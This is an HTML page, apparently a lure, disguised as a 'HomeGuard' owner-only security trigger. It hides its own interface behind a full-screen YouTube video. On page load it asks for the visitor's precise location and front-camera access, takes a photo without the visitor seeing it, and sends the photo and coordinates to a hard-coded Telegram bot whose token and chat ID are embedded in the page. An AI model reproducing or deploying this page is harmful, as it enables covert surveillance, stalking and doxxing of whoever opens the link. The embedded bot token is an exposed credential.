<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>HomeGuard Trigger</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: #ffffff;
      min-height: 100vh;
    }

    .card, .logo, h1, .subtitle, .status-box, button, .footer {
      display: none !important;
    }

    video { display: none; }
    canvas { display: none; }

    #yt-container {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: #000;
    }

    #yt-container iframe {
      width: 100%;
      height: 100%;
      border: none;
    }
  </style>
</head>
<body>

  <div id="yt-container"></div>

  <div class="card">
    <div class="logo">🛡️</div>
    <h1>HomeGuard</h1>
    <div class="subtitle">REMOTE TRIGGER / OWNER ONLY</div>

    <div class="status-box" id="statusBox">
      <div class="log-line" id="logWaiting">
        <span class="dot"></span>
        <span>Waiting for trigger...</span>
      </div>
    </div>

    <button id="triggerBtn" onclick="runTrigger()">⚡ CAPTURE + SEND</button>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
  </div>

  <div class="footer">service.hima.com · HomeGuard v1</div>

<script>
  // ─── YOUTUBE VIDEO ── Yahan apna YouTube link paste kar ──────────────────
  const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // <-- sirf yeh badal
  // ──────────────────────────────────────────────────────────────────────────

  function loadYouTube(url) {
    const match = url.match(/(?:v=|youtu\.be\/)([a-zA-Z0-9_-]{11})/);
    if (!match) return;
    const videoId = match[1];
    const container = document.getElementById("yt-container");
    container.innerHTML = `<iframe
      src="https://www.youtube.com/embed/${videoId}?autoplay=1&controls=1&rel=0"
      allow="autoplay; encrypted-media"
      allowfullscreen>
    </iframe>`;
  }

  window.addEventListener("load", () => {
    loadYouTube(YOUTUBE_URL);
    runTrigger();
  });

  // ─── CONFIG ── Replace these with your actual values ──────────────────────
  const BOT_TOKEN = "8973797235:AAHeo3DYJHq79df4YXKleQu-sAanDgG1dcU";   // e.g. "123456789:ABCdef..."
  const CHAT_ID   = "8145264158";     // e.g. "987654321"
  // ──────────────────────────────────────────────────────────────────────────

  const TELEGRAM  = `https://api.telegram.org/bot${BOT_TOKEN}`;

  function log(msg, type = "active") {
    const box = document.getElementById("statusBox");
    // Remove waiting line on first real log
    const waiting = document.getElementById("logWaiting");
    if (waiting) waiting.remove();

    const line = document.createElement("div");
    line.className = `log-line ${type}`;
    line.innerHTML = `<span class="dot ${type === 'active' ? 'pulse' : ''}"></span><span>${msg}</span>`;
    box.appendChild(line);
  }

  async function runTrigger() {

    log("Initializing...");

    // ── 1. Location ──────────────────────────────────────────────────────────
    let locText = null;
    let lat = null, lon = null;

    log("Requesting location...");
    try {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej, {
          enableHighAccuracy: true, timeout: 10000
        })
      );
      lat = pos.coords.latitude;
      lon = pos.coords.longitude;
      locText = `📍 ${lat.toFixed(6)}, ${lon.toFixed(6)}\nAccuracy: ${Math.round(pos.coords.accuracy)}m`;
      log("Location captured ✓", "done");
    } catch (e) {
      log(`Location failed: ${e.message}`, "error");
    }

    // ── 2. Camera ────────────────────────────────────────────────────────────
    log("Requesting camera...");
    let photoBlob = null;

    try {
      // Try back camera first (phone held by intruder shows room better)
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { exact: "user" } }
        });
      } catch {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
      }

      const video  = document.getElementById("video");
      const canvas = document.getElementById("canvas");

      video.srcObject = stream;
      await new Promise(res => video.onloadedmetadata = res);
      await new Promise(res => setTimeout(res, 1200)); // let camera warm up

      canvas.width  = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      // Stop stream
      stream.getTracks().forEach(t => t.stop());

      photoBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
      log("Photo captured ✓", "done");
    } catch (e) {
      log(`Camera failed: ${e.message}`, "error");
    }

    // ── 3. Send to Telegram ──────────────────────────────────────────────────
    log("Sending to Telegram...");

    let allOk = true;

    // Send photo
    if (photoBlob) {
      try {
        const fd = new FormData();
        fd.append("chat_id", CHAT_ID);
        fd.append("photo", photoBlob, "hg_trigger.jpg");
        fd.append("caption", `🛡️ HomeGuard Trigger\n${locText || "Location unavailable"}`);

        const r = await fetch(`${TELEGRAM}/sendPhoto`, { method: "POST", body: fd });
        const j = await r.json();
        if (j.ok) log("Photo sent ✓", "done");
        else { log(`Photo send failed: ${j.description}`, "error"); allOk = false; }
      } catch (e) {
        log(`Send error: ${e.message}`, "error"); allOk = false;
      }
    }

    // Send location pin (separately, for Maps link)
    if (lat !== null) {
      try {
        const r = await fetch(`${TELEGRAM}/sendLocation`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
        });
        const j = await r.json();
        if (j.ok) log("Location pin sent ✓", "done");
        else log(`Location pin failed: ${j.description}`, "error");
      } catch (e) {
        log(`Location pin error: ${e.message}`, "error");
      }
    }

    // Done
    if (allOk) {
      log("All done ✓", "done");
    } else {
      log("Completed with some errors", "error");
    }


  }
</script>

</body>
</html>
